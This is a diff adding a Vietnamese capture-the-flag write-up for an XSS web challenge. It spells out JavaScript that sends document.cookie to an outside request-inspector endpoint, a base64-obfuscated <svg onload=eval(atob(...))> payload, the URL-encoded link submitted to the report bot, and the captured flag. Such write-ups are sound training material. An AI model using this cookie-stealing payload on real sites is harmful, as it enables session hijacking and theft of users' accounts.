@@ -197,6 +197,57 @@ flag: KCSC{0xfd376061}
 
 
 
+
+
+# HI HI HI
+WED
+
+## Description:
+> đường dẫn: http://146.190.115.228:20109/
+
+## Solution:
+đầu tiên thì như tiêu đề của trang web đã gợi ý là XSS nên mình thực hiện intruder để tìm các payload có thể XSS, có rất nhiều payload có thể thực hiện được
+mình sẽ sử dụng:
+
+![img](./images/13.png)
+
+sau đó áp dụng kĩ thuật này trên PayloadsAllTheThing để tiến hành sửa đổi lại payload cho phù hợp:
+
+![img](./images/14.png)
+
+bây giờ tạo một server để lắng nghe kết quả trả về: https://requestinspector.com/inspect/01gpz8y6v58m9y6f3kw8w5t91s
+
+phần mã Javascript thực hiện gửi dữ liệu về server sẽ như sau: 
+```javascript
+var xhttp = new XMLHttpRequest();
+    xhttp.open("POST", "https://requestinspector.com/inspect/01gpz8y6v58m9y6f3kw8w5t91s", true);
+    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhttp.send(document.cookie);
+```
+
+sau đó base64 mã javascript: ICAgIHZhciB4aHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeGh0dHAub3BlbigiUE9TVCIsICJodHRwczovL3JlcXVlc3RpbnNwZWN0b3IuY29tL2luc3BlY3QvMDFncHo4eTZ2NThtOXk2ZjNrdzh3NXQ5MXMiLCB0cnVlKTsKICAgIHhodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgIHhodHRwLnNlbmQoZG9jdW1lbnQuY29va2llKTs=
+
+payload sẽ được sửa thành:  <svg onload=eval(atob("ICAgIHZhciB4aHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeGh0dHAub3BlbigiUE9TVCIsICJodHRwczovL3JlcXVlc3RpbnNwZWN0b3IuY29tL2luc3BlY3QvMDFncHo4eTZ2NThtOXk2ZjNrdzh3NXQ5MXMiLCB0cnVlKTsKICAgIHhodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgIHhodHRwLnNlbmQoZG9jdW1lbnQuY29va2llKTs="))>
+
+sau đó nộp link thu được vào phần report là được rồi:  http://127.0.0.1:20109/?message=%3Csvg+onload%3Deval%28atob%28%22ICAgIHZhciB4aHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeGh0dHAub3BlbigiUE9TVCIsICJodHRwczovL3JlcXVlc3RpbnNwZWN0b3IuY29tL2luc3BlY3QvMDFncHo4eTZ2NThtOXk2ZjNrdzh3NXQ5MXMiLCB0cnVlKTsKICAgIHhodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgIHhodHRwLnNlbmQoZG9jdW1lbnQuY29va2llKTs%3D%22%29%29%3E
+
+đến đây không hiểu sao nộp link mãi không được, mình để ý thấy cái này:
+
+![img](./images/15.png)
+
+sửa đường dẫn thành http://127.0.0.1:13337/?message=<svg onload=eval(atob("ICAgIHZhciB4aHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeGh0dHAub3BlbigiUE9TVCIsICJodHRwczovL3JlcXVlc3RpbnNwZWN0b3IuY29tL2luc3BlY3QvMDFncHo4eTZ2NThtOXk2ZjNrdzh3NXQ5MXMiLCB0cnVlKTsKICAgIHhodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgIHhodHRwLnNlbmQoZG9jdW1lbnQuY29va2llKTs="))>
+
+kiểm tra phía server ta nhận được flag:
+
+![img](./images/16.png)
+
+flag: Flag=KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}
+
+
+
+
+
+
 # XXD
 WED
 
